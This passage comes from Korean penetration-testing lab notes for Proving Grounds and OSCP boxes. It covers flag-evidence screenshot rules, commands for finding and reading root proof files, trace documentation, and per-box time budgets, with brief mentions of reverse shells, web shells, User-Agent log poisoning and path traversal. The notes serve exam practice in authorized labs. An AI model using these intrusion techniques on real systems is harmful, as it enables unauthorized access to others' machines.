| **규정 필수** | 대화형 셸에서 읽은 **플래그 내용** + **타겟 IP**(`ip a`·`ipconfig`)가 **한 장에** · 컨트롤 패널 제출 |
| **강력 권장** | `whoami`(Windows 만점 조건인 «SYSTEM·Administrator 권한 셸»을 입증하는 유일한 실무 수단) · `hostname` |

⚠️ **반례 — 「한 화면」이어도 항목이 빠지면 안 됨.** [[pyLoader]] 의 플래그 스크린샷(`Pasted image 20260629111100.png`)은 리스너 배너부터 `cat proof.txt` 까지 **한 화면**에 담겼고 `whoami`·프롬프트의 호스트명·플래그가 다 있으나 **타겟 IP(`ip a`)가 없음.** 시험이었으면 증거가 불완전함.
→ **TTY 없는 셸에서는 `;` 로 이어 붙인 «한 줄»이 안전함** — 여러 번 나눠 치면 스크롤로 잘려 한 화면에 안 담김.
⚠️ **값만 저장하면 아무것도 증명 못 함.** [[RubyDome]] 은 `~/PG/RubyDome/` 에 `proof_*.txt` 형식이 **하나도 없고** 스크린샷도 0장이라, 두 플래그가 값만 남았음.

**플래그를 «파일명»으로 찾을 때 두 플래그를 빠뜨리지 말 것:**
- `2>/dev/null` — 비특권 셸이 `/proc`·`/root` 를 훑으며 뱉는 `Permission denied` 수천 줄을 버림. 빼면 에러가 화면을 덮어 결과 한 줄을 놓침
- `-xdev` — 다른 파일시스템으로 넘어가지 않음. `/proc`·`/sys`·NFS 마운트를 훑느라 느려지는 것을 막음(A-42 의 죽은 NFS 마운트 함정과 같은 이유)
```bash
find / -xdev \( -name 'local.txt' -o -name 'proof.txt' -o -name 'user.txt' -o -name 'root.txt' \) 2>/dev/null
```

**실측 사례 — 값은 맞는데 «한 화면»이 아니었던 경우.** [[Kevin]] 의 플래그 기록은 `type proof.txt` 출력뿐이고 `hostname` 도 `ipconfig` 도 없음. **시험이었으면 감점임.** cmd 한 줄로 굳혀 둘 것(`ip a` 가 아니라 `ipconfig`, `;` 가 아니라 `&`):
```cmd
whoami & hostname & ipconfig & type C:\Users\Administrator\Desktop\proof.txt
```
**셸을 잡자마자** 이걸 치고 스크린샷을 남길 것.

**PG·OSCP 플래그는 32자 소문자 hex 임.** 길이·문자셋이 다르면 플래그가 아님 — 형식만 봐도 즉시 걸러지므로 미끼 파일에 시간을 쓰지 말 것. [[Astronaut]] 은 `/root/flag1.txt` 의 내용이 `T2Zmc2Vj` 였고 base64 디코드하면 그냥 `Offsec` 인 **장식용 더미**였음.
```bash
grep -rEo '\b[0-9a-f]{32}\b' /root /home 2>/dev/null
```
⚠️ **플래그가 «하나뿐인» 박스가 실재함** — [[Astronaut]] · [[Wombo]] · [[Bratarina]] · [[Detection]]. 포털 진행도가 `0/1` 이면 그것이 이미 알려주는 사실임. 노트에 `Local.txt value:` 를 비워 두지 말고 **「없음」과 근거**(harvest 전수 탐색 결과 · 포털 플래그 슬롯 수)를 적을 것 — 비워 두면 다음 사람이 「안 찾은 것」으로 오독함.
⚠️ **플래그 값은 랩 인스턴스마다 재생성되고, 한 세션 안에서도 달라질 수 있음**(A-6-12). [[Astronaut]] 은 두 번 풀렸고 값이 서로 다름 — 2026-06-15(`192.168.115.12`)의 `c7ff755b6276ae84f7e2a1e0a29de698` 는 스크린샷으로 남았고, 개작본이 적었던 `df08cc108a6bd0c2739fa0e24fc52f89` 는 어느 산출물에도 없어 **근거부족**임. **같은 박스의 옛 노트 값으로 재제출할 수 없음.**


**리눅스 — 플래그가 표준 위치에 없을 수 있음.** 일반 사용자 계정이 없는 박스에서는 `local.txt` 가 서비스 계정이 읽을 수 있는 곳에 놓임. [[plum]] 은 `/var/www/local.txt` 였음(셸 계정이 `www-data` 라 홈 디렉터리가 없음).
```bash
ls -la /home/*/ 2>/dev/null            # ① 표준 위치
ls -la /var/www/ /var/www/html/        # ② 웹 계정으로 잡았다면 여기
ls -la /tmp /opt /srv                  # ③ 흔한 대안
find / -name "local.txt" -o -name "proof.txt" 2>/dev/null   # ④ 최후
```
④는 느리니 ①~③을 먼저 침. **표준 위치 가정은 자주 깨짐** — [[Squid]] 는 `C:\local.txt` 였음.


**`local.txt` 를 얻었다고 박스가 끝난 것이 아님.** [[Flu]] 1차 세션은 거기서 멈춰 **1/2** 로 남았고 두 달 가까이 부분 완료 상태였음. 시험이라면 절반 점수임.
**증거 형식 실측 반례** — Flu 1차의 플래그 스크린샷(`Pasted image 20260714142017.png`)은 타겟 pty 프롬프트(`confluence@flu:/home/confluence$`)와 `cat local.txt` 가 한 화면에 있으나 **`whoami`·`hostname`·`ip a` 가 없음.** 규정 필수인 **타겟 IP** 가 빠졌으므로 시험이었으면 증거가 불완전함.
→ 2차 세션은 이것을 고쳐 한 줄로 묶어 찍었음:
```text
id; whoami; hostname; hostname -I; date; echo ---; cat /root/proof.txt; cat /home/confluence/local.txt; echo ---; ls -l /root/proof.txt /home/confluence/local.txt
```
— 출처: `~/PG/Flu/flag_evidence.txt`
`ls -l` 을 뒤에 붙인 것도 값어치가 있었음 — **파일 모드(`0644`)와 소유자가 함께 찍혀** 「왜 저권한에서 못 읽었는가」의 근거가 같은 화면에 남음.
⚠️ **`euid=0` 상태의 프롬프트는 `rootbash-5.2#` 로 뜸.** 증거에 `uid=0(root)` 를 담고 싶으면 `setresuid(0,0,0)` 으로 한 단계 더 갈 것(B-36).


**플래그가 안 보이면 「없다」가 답일 수 있음 — 전역 재귀 검색은 그 다음임.** [[Algernon]] 은 `proof.txt` 만 있고 `local.txt` 가 **애초에 배치되지 않은** 단일 플래그 박스였음. 「숨겨져 있겠지」 하고 `Get-ChildItem C:\ -Recurse -Filter local.txt` 를 돌리기 시작하면 수 분~수십 분이 날아가고, 그 명령이 조용히 깨지면 「돌았는데 없다」와 「안 돌았다」를 구분할 수도 없음(B-84).

순서:
1. **`-Force`/`dir /a`** 를 썼는가 — PG 플래그 파일은 **숨김 속성**인 경우가 있고 `Get-ChildItem`/`dir` 은 기본적으로 숨김을 안 보여줌
2. **`C:\Users` 를 먼저 나열해 «실제 사람 계정»을 확정** — `.NET v4.5`·`DefaultAppPool` 같은 앱풀 프로필과 `Public` 을 걸러냄
3. 각 계정의 Desktop 을 `-Force -ErrorAction SilentlyContinue` 로 전수 조회. `-ErrorAction` 은 접근 거부 항목에서 멈추지 않기 위한 것 — **SYSTEM 이라도 일부 항목에서 에러가 나고 그때 멈추면 결과가 잘림**
4. `C:\Users\Public` · `C:\` · `%USERPROFILE%\Documents` 도 후보
5. **여기까지 실패한 뒤에야** 전역 재귀 검색
6. **그래도 없으면 「없다」가 답일 수 있음** — SYSTEM 인데 안 보이면 정말로 없는 것이지 권한 문제가 아님

[[Algernon]] 은 2·3 두 단계로 결론이 났음 — 한 번 친 전역 `dir C:\ /s /b` 는 `2>/dev/null` 혼입으로 조용히 깨져 「판정 불가」였지(B-84) 「전역 검색 미실시」가 아님. [[Squid]] 도 「플래그가 표준 위치에 없었다 + `-Recurse` 함정」으로 같은 곳에서 막혔음.


**AD 박스는 `local.txt`(사용자)와 `proof.txt`(Administrator/SYSTEM)가 따로이므로 증거를 «두 번» 찍는다.**
```powershell
whoami; hostname; ipconfig | findstr IPv4; type C:\Users\<사용자>\Desktop\local.txt
```
⚠️ **웹셸에서 읽은 플래그는 0점** — 규정 원문이 *"this includes any type of web-based shell"*. `evil-winrm`·RDP 콘솔·`nc` 리버스셸은 대화형이라 문제없다.
⚠️ [[Heist]] 는 `proof.txt` 는 `whoami`(→ `nt authority\system`)와 한 화면에 담았으나(`파일보관\Pasted image 20260708153113.png`) **`local.txt` 는 한 화면 증거를 남기지 못했다** — 대화형 획득의 근거가 `*Evil-WinRM* PS …>` 프롬프트뿐이다. **플래그를 읽는 순간이 곧 증거를 만드는 순간이다.**

**⚠️ 미끼 파일 두 번째 사례.** [[Clue]] — `/root/proof.txt` 의 내용이 `The proof is in another file` 이었고, `ls` 로 옆의 `proof_youtriedharder.txt` 를 찾아야 진짜 값이 나옴. 위 [[Fowsniff]] 와 **동일 패턴**임(원본 VulnHub·커뮤니티 판의 잔재로 보이고 PG 가 채점하는 파일명은 별도임 `[가정]`).
→ **플래그로 보이는 파일을 하나 읽었다고 끝내지 말 것.** `ls -la` 로 같은 디렉터리를 함께 볼 것 — 형식 검사(32자 소문자 hex)에 걸리면 즉시 드러남.

**⚠️ 증거 항목 누락 — [[Twiggy]] 판.** 이 박스의 플래그 스크린샷에는 **`ip a`(타겟 IP)가 빠져 있었음.** 규정 필수 항목이라 시험이었으면 감점임(위 [[pyLoader]]·[[Flu]] 1차와 같은 누락). 한 줄로 굳혀 둘 것:
```bash
whoami; hostname; ip a | grep 'inet '; cat /root/proof.txt
```

**⚠️ 「무관해 보인다」로 안 읽고 넘긴 파일은 판단이 아니라 «추론»임.** [[Levram]] — `/root` 에 `email3.txt`(8바이트)가 있었다고 기록돼 있으나 **디렉터리 목록 산출물이 남아 있지 않고 실제로 열어보지도 않았음** `[가정]`. 8바이트는 플래그(32자) 크기가 아니고 파일명도 스토리 소품 계열이라 「무관」으로 판단했는데, **그 판단 자체가 크기·이름만으로 내린 추론**이었고 랩 정지로 재확인도 불가능함.
→ **랩 연습에서는 「무관해 보이면 넘어간다」가 효율적이지만 시험에서는 뒤집을 것** — `cat` 한 번이 1초임. `/root`·`/home/*` 의 파일은 **일단 다 읽을 것.** 8바이트짜리가 다른 호스트의 비밀번호인 경우가 실제로 있음(B-6-12).

### C-4. 스크린샷

**스크린샷은 박스가 살아 있을 때만 가능함.** 정지 뒤에는 되살릴 방법이 없음.
```sh
cd ~/PG/<박스> && chromium --headless --no-sandbox --disable-gpu --hide-scrollbars \
  --screenshot=shot_<포트>_<설명>.png --window-size=1280,900 http://<타겟>:<포트>/
```
찍을 것 — 진입점이 된 화면(로그인·업로드·관리 콘솔), 버전이 드러난 화면, 익스플로잇 성공 직후 화면. 로그로 대체되는 것은 안 찍어도 됨.
인증이 필요한 화면은 Windows 에서 터널: `ssh -N -L 18080:<타겟>:80 kali@10.44.44.128`.

**이 서비스를 다시 만나면 가장 먼저 확인할 것은?** — B 절 카드에 append 할 것.

**UI 에 버전 배지가 보이면 즉시 CVE 검색.** 무인증 웹앱이면 특히. [[Detection]]: 우상단 버전 배지 `v0.45.1` 확인만으로 SSTI CVE 직행(정찰~버전판정 2분).

**⛔ 헤드리스 캡처는 «오류 페이지도 성공으로» 저장함 — 반드시 열어서 확인할 것.**
헤드리스 브라우저는 연결에 실패해도 오류 페이지를 정상 렌더링해 PNG 를 만들고 **종료 코드 0** 을 반환함. 자동화 파이프라인에서는 그것이 성공으로 보임. 파일 크기(수십 KB)·색상 수도 정상 캡처와 구분이 안 됨.
```bash
file x.png && identify -format '%wx%h %k colors\n' x.png
```
**가장 확실한 것은 그냥 여는 것임.**
→ 위험은 두 겹임 — ⓐ「캡처가 됐으니 서비스가 살아 있다」는 **잘못된 확정 사실이 노트에 박히고 뒤의 판단이 그 위에 쌓임** ⓑ **OSCP 에서 스크린샷은 증거이므로 오류 페이지를 제출하면 그 플래그가 인정 안 됨**(E 절).
⚠️ [[Muddy]] 노트가 「정찰 캡처 4장이 전부 `ERR_ADDRESS_UNREACHABLE` 이었다」고 적었으나 **그 실물이 남아 있지 않음** — `~/PG/Muddy/` 에 `.png` 가 0개이고 볼트 `파일보관\` 의 Muddy 스크린샷 2장은 직접 열어본 결과 **정상 렌더 화면**(Ladon 카탈로그·WordPress 홈)임. **그 사례는 근거부족**이고, 기법 자체(헤드리스는 오류도 성공으로 저장함)만 일반 지식으로 유효함.

### C-5. 남긴 흔적

**「남긴 흔적」이 요구하는 것은 «지우는 것»이 아니라 «무엇을 남겼는지 알고 적는 것»임.** 로그 삭제는 흔적을 더 남기고 되돌릴 수 없음.

**온라인 사전공격은 흔적 «규모»를 자각하고 쓸 것.** [[Monster]] 는 한 시간 안에 한 IP 에서 같은 엔드포인트로 **약 44,000건**의 실패 POST 를 남겼음(10k 런 20,000 + cewl 런 약 24,000). **어떤 로그 상관분석에도 걸리는 규모**이고 실전 관여였다면 그 자체로 작전 실패임 — 시험 보고서에도 이 규모를 그대로 쓸 것.

**타겟 원복은 하지 않음** — 인스턴스는 Stop 하면 파괴되므로 되돌릴 것이 없음. 업로드 파일·만든 계정·바꾼 설정은 **원복 대상이 아니라 공격 경로의 일부**라 「무엇을 심었는지」를 표로 적을 것. [[Zipper]] 의 `@enox.zip`(와일드카드 페이로드)·업로드된 웹셸 zip·비밀번호가 노출된 `backup.log` 가 그 형식임.

**반면 Kali 쪽은 반드시 정리함** — 리스너·tmux 세션·마운트. **PID 를 `ss -lntp` 로 특정하고 tmux 는 세션 이름으로만 종료할 것**(광범위 `pkill` 은 tmux 서버를 통째로 날린 전례가 있어 금지). 다른 박스 소유 세션과 내 것이 아닌 리스너는 **건드리지 말 것.** 산출물(실패 로그 포함)은 전부 보존함.
**보고서에는 «남긴 것»과 «원복 방법»을 반드시 함께 적을 것.** 그리고 **원복이 불가능한 변경**(비밀번호 해시 덮어쓰기 · 관리자 비밀번호 변경 · 계정 생성)은 **사전 서면 승인 없이는 하지 않음.** [[Butch]] 의 「남긴 흔적」 표가 그 형식임 — **항목 / 상태 / 복구 가능 여부** 세 열.
→ 랩에서도 같은 형식으로 적어 둘 것. 되돌릴 수 있는 페이로드를 먼저 고르는 규율은 A-4-11.


---

## D. 시간 배분 · 손절 기준

**손절선은 1시간** — 그 안에 셸이 안 나오면 그 시점까지의 상황을 정리할 것. 못 푼 박스도 「어디까지 갔고 왜 막혔는지」가 남으면 시험장에서 값을 함.

**그 한 시간은 «작업 시간»임.** 크래킹이나 스캔이 끝나기를 지켜보며 보낸 시간도 여기서 흘러감. 던져놓고 다른 벡터를 때리면 같은 한 시간에 시도 횟수가 몇 배가 됨.

**후보군이 유한하면 배치로 쏠 것.** disable_functions 우회 함수, LFI 경로, 기본 자격증명, 확장자 우회 — 목록이 이미 정해진 것을 하나 보내고 응답 보고 다음을 만들 이유가 없음. 한 번에 쏘고 응답을 diff 할 것.

**기본 자격증명도 for 루프 한 방 + 응답 diff 임.** 판정은 상태코드가 아니라 **응답 본문 크기 diff** 로도 충분함([[CVE-2023-46818]]: 성공 0B vs 실패 7,406B).
⚠️ 크기 diff 는 **1차 신호**일 뿐 — 성공 확정은 **직후 인증 페이지가 세션 쿠키로 열리는가**로 할 것. 안 통한 응답 파일을 전부 남기면 그대로 시행착오 기록이 됨.

실측([[GLPI]], 2026-08-21) — disable_functions 우회 함수를 순차로 스무 번 가까이 돌아 **9분 41초** 소모(첫 프로빙 `rce_a.html` 22:52:00 UTC → 첫 성공 `am_id.html` 23:01:41 UTC). 전체는 nmap 시작 22:51:09 → `proof_root.txt` 23:18:24 = **27분 15초**(`~/PG/GLPI/` 파일 mtime 으로 재구성).
⚠️ 이전 판은 「11분 / 전체 16분」으로 적혀 있었으나 **mtime 재현으로 반증됨**(2026-08-25). 같은 수치가 `CLAUDE.md` §2 에도 있음.

실측([[Wheels]]) — 정찰 02:32 → XPath 착수 03:59 = **약 90분을 게이트 오판에 태움**(A-21). 03:43 에 이미 손절 직전이었고, 정답의 근거(푸터 `info@wheels.service`)는 **정찰 단계부터 손에 있었음.** 온라인 브루트(bcrypt)에 매달린 것이 그 시간의 대부분.

실측([[Assignment]]) — 전체 약 30분. 정찰 1분(`recon.sh` 63초) · 80 매스어사인먼트~자격증명 6분 · Gogs 훅 RCE 3분 · **root 크론 특정 14분**(`head -20` 사고와 pspy 실패가 대부분, A-45).
**root 크론을 못 찾고 15분이 지나면** ⓐ `find` 결과를 자르지 않았는지 ⓑ 프로세스 관측을 걸어놨는지 둘을 점검할 것. 크론은 **주기를 기다리는 시간**이 들어가므로 심어두고 다른 벡터를 볼 것.

실측([[Fractal]]) — Fundamental. secret→RCE→DB→FTP→SSH→sudo 사슬이 명확해 손절 여지가 적었음. **여기서 태우는 곳은 리버스셸 포트·harvest 블로킹 같은 «인프라» 문제이지 벡터 판단이 아니었음**(A-31·A-33).

**betty 비번 찾기 류의 손절 기준**([[GLPI]]) — SSH 재사용·암호화 저장소·홈 파일을 **15분 안에** 지우고 **DB 전체 grep** 으로 넘어갈 것(B-62). bcrypt 크래킹은 백그라운드에 걸어두되 **거기서 대기하지 말 것**(A-22).

실측([[Robust]]) — 웹 초급 박스. 게이트 우회~SQLi 덤프 15분 내, Sticky Notes 피벗 5분. 로그인 폼 SQLi(A-25, 실제로는 미끼)에 매달리지 않은 것이 시간을 아꼈음.

실측([[Detection]]) — 정찰~버전판정 2분, SSTI 확인 5분. **손절점은 「셸 잡고도 진입점을 죽였을 때」** — 리버트를 빨리 요청하는 편이 데드락을 헤매는 것보다 나음(A-32).

실측([[CVE-2023-46818]]) — 정찰 14:34 → RCE 확인 14:40 → 플래그 14:42, **실질 8분.** 유명 앱 + 버전이 보이면 디렉터리 브루트·미끼 포트에 시간 낭비 말 것(A-17). 막힌 지점은 전부 **페이로드 형태**였음 → **막히면 「벡터」를 바꾸기 전에 페이로드 「형태」부터 의심**할 것(필터 우회·인코딩·구문). 리버스셸은 443 으로 붙었고, 안 붙으면 계층 분리(A-31).

실측([[Graph]]) — 14:51(정찰) ~ 15:11(정리)로 **약 20분.** SNMP/UDP 확인 낭비 거의 없고 gobuster 중복도 10분 안쪽이라 손절 판단이 필요한 수준이 아니었음. **진짜 아쉬운 지점은 시간 낭비가 아니라 「기록 누락」**(A-63) — 시험장에서는 「빨리 푸는 것」과 「재현 가능하게 남기는 것」 사이에서 후자를 등한시하면 **보고서 점수가 깎임.**

실측([[Wombo]]) — 정찰 종료 11:25:38 → 플래그 12:02:31 = **36분 53초.** 그중 대체 경로(cron·SSH 키) 탐색이 11:30~11:51 의 **약 21분**이고, 그 진입 자체가 `errno 98` 오독(A-31)에서 나옴. 순서 규율 둘: ⓐ **대체 경로를 파기 전에 egress 를 확정**할 것 ⓑ **페이로드를 준비하기 전에 경로 가용성부터 한 줄로 판정**할 것 — `config set dir /root/.ssh` 를 먼저 쳤으면 SSH 키 생성과 cron 시도 일부가 통째로 불필요했음(A-2-10 ⓑ).
⚠️ 그 노트의 원래 서술 「익스플로잇 5분」은 **mtime 과 맞지 않아 반증됨**(첫 시도 11:27:28 → 플래그 12:02:31 = 35분).

실측([[Mice]]) — 첫 스캔 22:20 → user 플래그 22:34(**14분**) → 권한상승 경로 확정 23:20 → SYSTEM 획득 익일 00:05(**45분 더**). 취약점 식별은 15분 안, 권한상승 **경로 식별**(FileZilla → CVE-2021-35448)이 30분, **나머지는 헤드리스 RDP 세션 문제로 소진**(23:20~00:05). 실제 시험(mstsc 정상 접속)이라면 트레이 클릭 몇 번으로 끝나는 구간임. → **GUI 가 안 보이면 `query session` 부터 칠 것**(A-48).

실측([[Fikklish]]) — nmap 18:26 → admin 로그인 **19:19 = 53분**, 그 뒤 RCE → tom → root 는 **9분**(19:28). 태운 시간의 정체는 셋이고 **서로 겹침**(레이트리밋을 기다리는 동안 다른 것을 돌려 합계가 53분을 넘음):
- **메일 가로채기 헛다리 27분**(A-2-11) — 최대 손실 구간. **아웃바운드 패킷 0 을 확인하는 데 5분이면 충분했던 자리**
- **브루트포스 락아웃 회피 시행착오 약 45분**(A-2-12) — 다른 작업과 시간 겹침
- captcha 파싱 약 8분(B-1-18) · 리스너 포트 공유 약 6분(A-31)

→ **손절 지점이 명확한 박스임** — 메일 가로채기에서 아웃바운드가 0이면 5분에 접고, 로그인만 되면 그 뒤는 9분짜리임.

실측([[Cockpit]]) — 시간을 먹은 것이 **전부 「진짜 공격면 밖」**이었음: 9090 catch-all 브루트 **2시간 반**(건진 것 0, A-1-13) · 1일차 80 브루트 **2시간**(차단 의심으로 결과 6건, A-1-14) · 셸 획득 후 `sudo -l` 까지 **108분 공백**(C-2). 정작 정답 경로는 로그인 우회 → base64 → Cockpit 로그인 → `sudo -l` 로 **10:53~11:13 의 20분**임.

실측([[Hawat]]) — **소스 확보 우선이 통째로 이득이었던 사례.** 전체 25분(`~/PG/Hawat/` mtime, 09:16:03 nmap → 09:25:42 마지막 산출물). 구간 분해:

| 구간 | 시각 | 소요 |
|---|---|---|
| 정찰(nmap 2회 + services) | 09:15:12 ~ 09:16:48 | 약 1분 36초 |
| 소스 회수·전개(Nextcloud WebDAV) | 09:16:59 ~ 09:17:14 | 약 15초 |
| 자가 가입 · 오라클 구축 | 09:18:24 ~ 09:18:41 | 약 17초 |
| 디렉터리 열거(50080·30455) | 09:19:38 ~ 09:20:30 | 약 52초 |
| **웹루트 헛짚기 → 탐색 → 파라미터화** | 09:20:35 ~ 09:23:20 | **약 2분 45초** |
| 마무리(재로그인 세션) | ~ 09:25:42 | — |

**최대 항목이 「어느 웹루트에 쓸 것인가」였음**(A-2-14). 소스 리뷰 자체는 15초에 끝났고 그 대가로 UNION 추출 시도가 **0회**였음 — 출력 채널 3개가 죽었다는 판정을 주입 전에 내렸기 때문(B-12).
→ **소스가 손에 들어오는 정황(zip · `.git` · 백업 · 공유 스토리지)이 보이면 다른 것보다 먼저 확보할 것**(B-1-21). 블랙박스로 blind SQLi 를 찾는 것보다 훨씬 쌈.
⚠️ 원 노트의 「소스 확보와 리뷰에 상당한 시간이 들었다」는 mtime 과 어긋남 — 소스 회수·전개는 `issuetracker.zip`(09:17:14)과 `src/`(09:16:59) 사이 약 15초임. 위 표는 **재실측으로 정정한 것**임.

실측([[Outdated]]) — 전체 **12분**(첫 스캔 15:24:28 → `proof_root.txt` 15:36:56). **user 플래그까지 4분**(15:28:36). 유일하게 태운 곳은 **CVE 발화 조건 5분**(15:30:46 → 15:35:54)이고 원인은 응답 «본문»을 안 읽은 것(A-15). **발화 조건을 추측 대신 소스로 읽은 것이 빨랐음** — 조건 셋(Referer·`mode=new`·슬래시 잘림)을 조합 탐색으로 풀었으면 시간이 몇 배가 됐을 것.

산출물 mtime 으로 재구성한 시간표(KST. 타겟 로그는 UTC 라 9시간 차 — `06:28 UTC` = `15:28 KST`):

| 시각 | 산출물 | 무슨 일 |
|---|---|---|
| 15:24:40 | `quick.log` | top-1000 스캔 |
| 15:24:45 | `nmap.log` | 전 포트 스캔 |
| 15:24:57 | `hdr1.txt` · `out1.pdf` | mPDF 6.0 지문 확보 |
| 15:25:32 | `try1_annotation_passwd.pdf` | LFI 첫 성공 |
| 15:27:49 | `gobuster.log` | `/config`·`/vendor` |
| 15:28:17 | `config.php.txt` | 자격증명 |
| **15:28:36** | `proof_user.txt` | **user 플래그 — 시작 4분** |
| 15:29:04 | `enum_user.txt` | 열거 일괄 |
| 15:29:55 | `cj.txt` | Webmin 로그인 |
| 15:30:21 | `pu.html` | package-updates 접근 확인 |
| 15:30:46 | `exploit_resp.html` | **첫 익스플로잇 — Referer 차단** |
| 15:35:54 | `resp2.html` | 명령 실행 성공(리버스셸 페이로드) |
| **15:36:56** | `proof_root.txt` | **root — 전체 12분** |

⚠️ 실패 로그는 `try1`·`try4` 만 남음. 그 사이 `try2`·`try3` 는 보존되지 않았음. `notes_init.sh`(0바이트)와 `extract/`(빈 디렉터리)도 그대로 보존 — 「빈 결과를 받았다」는 기록임.

**[[Pebbles]] 손절 판단** (실측 타임라인 09:54 정찰 → 10:25 플래그 = 31분)

| 대상 | 언제 접는가 |
|---|---|
| 8080 「Tomcat」 | `/manager/html`·`/index.jsp` 가 404 인 것을 본 순간. 여기서 10분 이상 쓰면 함정에 빠진 것 |
| FTP · SSH | 익명 530 + 버전이 무해(`vsftpd 3.0.3` ≠ 백도어 2.3.4)를 확인하면 즉시 웹으로. **웹에 명백한 진입점이 있으면 신호가 강한 쪽부터 팜** |
| MySQL UDF | 플래그가 파일 하나면 아예 시작하지 않음 — 단 **시험이면 점수를 위해 결국 필요함**(C-3) |
| blind 추출이 안 붙을 때 | 30분을 넘기지 말 것. 코드가 아니라 **타이밍/컨텍스트**가 원인일 때가 많음 |
| blind 로 «긴 파일» 읽기 | 문자당 요청이 7회라 수백 바이트면 수십 분. 5분 안에 끝날 분량이 아니면 대상을 잘라 조각만 가져올 것(A-67) |

실측([[ClamAV]]) — **RCE 가 이미 확정됐는데 셸이 안 붙으면 그것은 「경로 선택」 문제가 아니라 「채널 제약」 문제임.** 다른 서비스로 눈을 돌리지 말고 **채널을 계측할 것**(A-39). Fundamental 박스, 정찰 시작 14:22:36 → RCE 확정 14:25:19(**2분 43초**) → root 대화형 셸 14:35:31. 중간 **10분 12초**가 전부 채널 제약이었고 방화벽 문제는 하나도 없었음. 그 10분 안에서도:
- 14:26~14:31 — 절대경로 실행이 계속 무반응(try2~try7). **5분**
- 14:32:03 — 상대경로 `d.sh` 성공 + 도구 인벤토리 회수
- 14:32~14:34 — perl→443 세 번 실패, `killall wget` 시도(try9~try12)
- 14:35:31 — 포트 4444 로 바꾼 q.sh → root 셸

→ **도구 인벤토리를 «먼저» 돌리는 쪽이 쌌음**(B-87). 실제로 그걸 돌린 14:32 이후로는 **3분 28초** 만에 끝났음. 리스너 포트를 바꿔가며 재시도하는 것보다 인벤토리 한 번이 앞섬.
⚠️ 원 노트의 「15분 안에 RCE」는 **실측과 다름 — 2분 43초**임(`nmap.log` 헤더 14:22:36 ↔ `try1.log` mtime 14:25:19).

실측([[Monster]]) — 정찰~Monstra 특정 **5분**, 크리덴셜 확보까지 **27분**, RCE~셸 **8분.** **크리덴셜 구간이 전체의 3분의 2**였고 그중 15분이 캡차 삽질(A-2-25)임. → **소스가 손에 있을 때는 엔드포인트를 두드리기 전에 그 엔드포인트로 뭘 할 수 있는지부터 읽을 것**(B-1-21).
⚠️ **이 박스는 `1/2`(local 만, root 미완)임.** 권한상승은 후보를 다 태우고도 못 올라갔고, **끝난 이유는 기술적 실패가 아니라 운영 결정**(다른 박스 기동으로 슬롯 규칙에 걸려 리버트)임 — A-68.

실측([[Zipper]]) — 손절 판단표:

| 구간 | 실제·권장 | 판단 |
|---|---|---|
| feroxbuster 전수 스캔 | **19분** | **길다.** 작은 사전 2분 → 손을 움직이며 큰 사전은 백그라운드. 확장자에 `php` 필수(A-1-20) |
| LFI 발견 → 소스 유출 | 짧음 | `?file=` 을 보면 `php://filter` 가 첫 수. **여기서 10분 넘게 헤매면 파라미터 자체를 의심**(B-1-30) |
| 업로드 → `zip://` 실행 | 짧음 | 소스를 읽었으면 자명함. **소스 확보가 시간의 대부분을 절약했음** |
| **polkit 선행 시도** | **약 19분**(11:28 → 11:47) `[가정]` | **순손실 구간.** 열거를 끝내기 전에 범용 CVE 를 던졌음(A-4-12) |
| privesc 열거 | linpeas | `/etc/crontab` 직접 `cat` 이 더 빠름. 5개 반사 명령이면 3분 |
| 크론 대기 | 1분 | 대기 중 `ps` 경로를 병행했으면 무엇이 터지든 이겼음 |

손절 기준 둘 — **LFI 파라미터를 찾은 뒤 30분 안에 소스가 안 나오면** 래퍼가 막힌 것이므로 로그 포이즈닝(`access.log` 의 User-Agent 에 `<?php ?>`)이나 `/proc/self/environ` 으로 방향을 틀 것. **권한상승 열거를 20분 했는데 아무것도 안 나오면** 크론을 놓쳤을 가능성이 가장 높으므로 `pspy64` 로 2분만 지켜볼 것.

실측 `[가정]`([[Fanatastic]]) — **아래는 측정치가 아니라 이 경로를 재현할 때의 합리적 기준임:**

| 단계 | 목표 | 손절선 |
|---|---|---|
| 정찰(nmap + 3000·9090 열거) | 10분 | 20분 넘으면 열거를 멈추고 **버전 CVE 검색으로 전환** |
| 버전 판정 → CVE 매칭 | 5분 | Grafana 8.3.0 을 확인한 순간 **다른 경로 탐색은 전부 중단** |
| 트래버설 성립 확인(`/etc/passwd`) | 10분 | 404 가 나와도 30분 이상 붙잡지 말고 **B-14 체크리스트를 순서대로** |
| 설정·DB 탈취 | 5분 | — |
| 복호화 | 20분 | 40분 넘으면 admin 해시 크랙이 아니라 **포맷·모드를 다시 확인**(B-68) |
| SSH + `id` | 2분 | — |
| privesc | 10분 | **`id` 에 `disk` 가 보였으면 다른 열거는 하지 말 것**(B-3-10) |

**시간을 태우는 블랙홀 둘** — ⓐ`user` 테이블 admin 해시 크랙(**절대 하지 말 것.** 가역 암호문이 바로 옆에 있음, B-67) ⓑ9090 Prometheus 파고들기(완전 비인증이라 매력적이나 관리 API 가 꺼져 있어 길이 없음 — `web.enable-admin-api=false` 를 확인한 순간 접을 것).
→ **둘 다 「그럴듯해 보인다」는 것이 위험의 근원임. 매력적인 막다른 길이 «명백한» 막다른 길보다 비쌈.** 「들어갈 수 있다」와 「쓸모가 있다」는 다름.

참고([[Muddy]]) — ⚠️ 이 박스의 시간 배분은 **mtime 근거가 없어**(Kali 산출물이 정찰 6개뿐) 실측 표에 넣지 않음. 판단 근거만 남김:

| 구간 | 판단 |
|---|---|
| 유령 포트 3개(443·808·908) | 10분 안에 손절. **`--reason` 재스캔 한 번이면 끝남**(A-1-18) |
| WordPress 5.7 | 15분 안에 손절. `wp-login.php` 가 404·302 면 그 순간 접음(A-2-18) |
| Ladon 버전 특정 | 익스플로잇에 영향이 없다고 판단되면 **더 좁히지 않음**(A-13) |
| `apache2.conf` XXE 우회(OOB DTD) | **시도조차 안 하는 것이 정답** — 목표 파일이 평문이었음(A-2-20) |
| 크론 대기 | 60초 — **대기 중 다른 열거를 병행** |

**정적 웹은 15분에 접을 것.** 판정 기준은 셋 — 폼 없음 · 동적 확장자 없음 · 파라미터 없음. 셋이 다 참이면 웹은 서사 전달용이고 공격면이 아님(A-1-22).
실측([[Fowsniff]], `writeup_notes.txt` 시간순 기록, Kali 로컬시각) — **14:53 → 15:05, 약 12분**에 root. 내역은 정찰 3분 · **이미지 스테가노 헛다리 5분**(A-1-21) · 크랙+스프레이 4분 · 권한상승 3분(구간이 일부 겹침). 5분이 그 규율을 어긴 부분임.
메커니즘을 `/proc` ppid 체인으로 확인한 15:06~15:07 은 플래그를 잡은 뒤 노트를 위해 추가로 한 작업이라 공략 시간에 넣지 않음.

